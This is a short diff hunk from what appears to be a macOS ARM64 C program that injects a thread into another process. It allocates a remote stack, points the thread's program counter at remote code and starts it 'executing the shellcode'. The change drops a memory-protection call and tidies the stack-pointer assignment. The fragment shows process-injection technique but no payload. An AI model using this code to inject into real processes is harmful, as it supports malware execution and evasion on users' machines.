@@ -120,16 +120,13 @@ int main() {
         return -1;
     }
 
-    // Set the memory protection of the allocated memory for the stack to read and write
-    kr = mach_vm_protect(task, remoteStackAddr, stackSize, FALSE, VM_PROT_READ | VM_PROT_WRITE);
-
     // Calculate the top of the stack, ensuring it is aligned to a 16-byte boundary
     mach_vm_address_t stackTop = (remoteStackAddr + stackSize) & ~0xFULL;
 
     // Set up the thread state for the new thread in the target process
     arm_thread_state64_t threadState = {0};
     threadState.__pc = remoteCodeAddr;
-    threadState.__sp = (remoteStackAddr + stackSize) & ~0xFULL;
+    threadState.__sp = stackTop;
 
     // Create a new thread in the target process that starts executing the shellcode
     thread_act_t remoteThread; // The thread_act_t variable to hold the reference to the newly created thread
